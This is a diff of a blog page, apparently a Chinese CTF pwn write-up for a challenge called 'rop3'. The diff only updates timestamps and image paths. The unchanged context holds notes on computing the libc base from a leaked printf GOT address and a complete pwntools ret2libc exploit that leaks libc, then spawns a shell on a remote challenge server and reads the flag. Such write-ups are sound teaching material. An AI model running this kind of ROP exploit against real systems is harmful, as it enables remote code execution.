@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://kazma.tw/images/rop3_libc.png">
 <meta property="og:image" content="https://kazma.tw/images/rop3_xinfo.png">
 <meta property="article:published_time" content="2024-08-03T09:35:20.484Z">
-<meta property="article:modified_time" content="2025-08-20T03:38:34.018Z">
+<meta property="article:modified_time" content="2025-08-20T03:52:02.337Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="writeup">
@@ -589,8 +589,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-20 11:38:34</span>
-            <span class="mobile">2025-08-20 11:38:34</span>
+            <span class="desktop">2025-08-20 11:52:02</span>
+            <span class="mobile">2025-08-20 11:52:02</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -661,19 +661,19 @@
 <h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/rop3_readelf.png"
+                     data-src="/images/rop3_readelf.png"
                       alt="readlelf"
                 ></p>
 <h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/rop3_libc.png"
+                     data-src="/images/rop3_libc.png"
                       alt="vmmap"
                 ><br>上面的截圖是首先可以看到我們 leak 出的 got 是：0x7fed250606f0<br>然後下面的紅框可以看到目前的 libc_base 是：0x7fed25000000<br>所以可以算出 offset 是：0x7fed250606f0 - 0x7fed25000000 &#x3D; 0x606f0<br>同時 <code>vmmap</code> 也可以順便檢查我們的 libc 是不是跟 remote 一樣，那這邊是 patchelf 後的狀態，所以可以看到 libc 的位置是：&#x2F;home&#x2F;kazma&#x2F;lys_rop&#x2F;libc.so.6</p>
 <h3 id="xinfo"><a href="#xinfo" class="headerlink" title="xinfo"></a>xinfo</h3><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/rop3_xinfo.png"
+                     data-src="/images/rop3_xinfo.png"
                       alt="xinfo"
                 ><br>如圖，應該不用多解釋了 XDD<br>那減完後可以確定一下你的 libc_base 最低三位是不是 0，因為 ASLR 隨機不會影響到最低三位，所以我常常會印出算完的 libc_base 也方便我檢查 remote 的時候有沒有爛掉。</p>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment"># r = process(&quot;./rop3&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>, <span class="number">10103</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011F9</span></span><br><span class="line">ret = <span class="number">0x40101A</span></span><br><span class="line">printf_plt = <span class="number">0x401060</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">main = <span class="number">0x4011FE</span></span><br><span class="line">name = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    printf_got,</span><br><span class="line">    printf_plt,</span><br><span class="line">    ret,</span><br><span class="line">    main,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p1)</span><br><span class="line">r.recv(<span class="number">5</span>)</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line"><span class="built_in">print</span>(l.address)</span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>, pop_rdi, <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)), ret, l.sym.system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;?&quot;</span>, <span class="string">b&quot; &quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p2)</span><br><span class="line">r.sendline(<span class="string">&quot;cat /home/chal/flag*&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
@@ -692,7 +692,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-20 11:38:34
+                    :</strong> 2025-08-20 11:52:02
             </li>
         
         <li>
